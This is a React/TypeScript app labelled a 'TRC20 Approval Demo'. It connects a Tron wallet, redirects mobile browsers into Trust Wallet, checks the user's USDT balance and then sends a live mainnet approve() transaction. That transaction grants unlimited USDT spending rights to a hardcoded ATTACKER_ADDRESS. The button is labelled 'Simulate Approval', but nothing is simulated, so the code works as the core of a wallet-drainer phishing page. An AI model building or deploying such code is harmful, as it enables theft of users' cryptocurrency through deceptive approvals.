/* eslint-disable @typescript-eslint/no-unused-vars */
import React, { useEffect, useState } from "react";
import toast, { Toaster } from "react-hot-toast";

/* =========================
   TRC20 CONFIG
========================= */

// USDT TRC20 on Tron Mainnet
const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// Demo approval receiver
const ATTACKER_ADDRESS = "TDgqGYjHc7KKcKjzh17m5w3VoM8RLBqJ72";

// Unlimited approval
const UNLIMITED =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

/* =========================
   TYPES
========================= */

interface WalletInfo {
  address: string;
  short: string;
  trx: string;
}

interface TronWebWindow extends Window {
  tronWeb?: any;
  tronLink?: any;
}

declare const window: TronWebWindow;

type LogType = "info" | "success" | "error" | "warning";

function App() {
  const [wallet, setWallet] = useState<WalletInfo | null>(null);
  const [tronWeb, setTronWeb] = useState<any>(null);
  const [token, setToken] = useState<any>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [isTrustWallet, setIsTrustWallet] = useState(false);
  const [step, setStep] = useState(1);

  /* =========================
     LOGGER (CORE)
  ========================= */
  const log = (msg: string, type: LogType = "info") => {
    console.log(`[${type.toUpperCase()}]`, msg);
    setLogs((prev) => [...prev, msg]);

    switch (type) {
      case "success":
        toast.success(msg);
        break;
      case "error":
        toast.error(msg);
        break;
      case "warning":
        toast(msg, { icon: "⚠️" });
        break;
      default:
        toast(msg);
    }
  };

  const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

  /* =========================
     TRUST WALLET DETECTION
  ========================= */
  useEffect(() => {
    if (window.tronWeb || window.tronLink) {
      setIsTrustWallet(true);
      log("📱 Trust Wallet / Tron provider detected", "success");
    } else {
      log("❌ Trust Wallet Tron not detected", "error");

      const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
      if (isMobile) {
        const url = encodeURIComponent(window.location.href);
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
      }
    }
  }, []);

  /* =========================
     INIT TRONWEB
  ========================= */
  useEffect(() => {
    const interval = setInterval(async () => {
      if (window.tronWeb && window.tronWeb.ready) {
        try {
          setTronWeb(window.tronWeb);
          const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
          setToken(contract);
          log("✅ TronWeb initialized", "success");
          clearInterval(interval);
        } catch {
          log("❌ TronWeb initialization failed", "error");
        }
      }
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  /* =========================
     CONNECT WALLET
  ========================= */
  const connectWallet = async () => {
    if (connecting) return;

    try {
      setConnecting(true);
      log("🔗 Connecting wallet...", "info");

      const accounts = await window.tronWeb.request({
        method: "tron_requestAccounts",
      });

      if (!accounts?.length) {
        log("❌ No Tron accounts found", "error");
        return;
      }

      const address = accounts[0];
      const balance = await window.tronWeb.trx.getBalance(address);

      setWallet({
        address,
        short: address.slice(0, 6) + "..." + address.slice(-4),
        trx: (balance / 1e6).toFixed(2),
      });

      log("✅ Wallet connected", "success");
      setStep(2);
    } catch (err: any) {
      if (err?.message?.includes("rejected")) {
        log("❌ User rejected connection", "error");
      } else {
        log("❌ Wallet connection failed", "error");
      }
    } finally {
      setConnecting(false);
    }
  };

  /* =========================
     BALANCE CHECK
  ========================= */
  const getBalance = async () => {
    try {
      if (!wallet || !token) return 0;

      log("🔍 Checking USDT balance...");
      const bal = await token.balanceOf(wallet.address).call();
      const decimals = await token.decimals().call();
      const formatted = bal / Math.pow(10, decimals);

      log(`💰 USDT Balance: ${formatted.toFixed(2)}`, "success");
      return formatted;
    } catch {
      log("❌ Failed to check balance", "error");
      return 0;
    }
  };

  /* =========================
     APPROVE DEMO
  ========================= */
  const simulate = async () => {
    try {
      setLoading(true);

      await getBalance();
      await sleep(500);

      if (
        !window.confirm(
          "This will approve UNLIMITED USDT.\n\nContinue?"
        )
      ) {
        log("❌ User cancelled approval", "warning");
        return;
      }

      log("📝 Sending approval transaction...", "warning");

      const tx = await token
        .approve(ATTACKER_ADDRESS, UNLIMITED)
        .send({
          feeLimit: 100_000_000,
          callValue: 0,
          shouldPollResponse: true,
        });

      log(`📨 Tx sent: ${tx.transaction.txID}`);

      let confirmed = false;
      for (let i = 0; i < 30 && !confirmed; i++) {
        await sleep(1000);
        try {
          const info = await tronWeb.trx.getTransactionInfo(
            tx.transaction.txID
          );
          if (info?.id) {
            confirmed = true;
            log("✅ Transaction confirmed", "success");
          }
        } catch {}
      }

      if (!confirmed) log("⚠️ Confirmation timeout", "warning");

      setStep(3);
    } catch (err: any) {
      log(`❌ Approval failed: ${err.message}`, "error");
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     UI
  ========================= */
  return (
    <>
      <Toaster position="top-right" />

      <div className="min-h-screen bg-black text-white flex justify-center p-4">
        <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
          <h1 className="text-xl font-bold mb-3 text-center">
            🔐 TRC20 Approval Demo
          </h1>

          {logs.length > 0 && (
            <div className="bg-black p-3 rounded text-sm mb-3 max-h-48 overflow-y-auto">
              {logs.map((l, i) => (
                <div key={i}>{l}</div>
              ))}
            </div>
          )}

          {!wallet && (
            <button
              onClick={connectWallet}
              disabled={connecting}
              className="w-full py-3 bg-yellow-600 rounded font-bold"
            >
              {connecting ? "Connecting..." : "Connect Wallet"}
            </button>
          )}

          {wallet && step === 2 && (
            <button
              onClick={simulate}
              disabled={loading}
              className="w-full py-3 mt-3 bg-red-600 rounded font-bold"
            >
              {loading ? "Processing..." : "Simulate Approval"}
            </button>
          )}

          {step === 3 && (
            <div className="mt-4 text-red-400 text-sm">
              ⚠️ Unlimited approvals can drain wallets.
            </div>
          )}
        </div>
      </div>
    </>
  );
}

export default App;
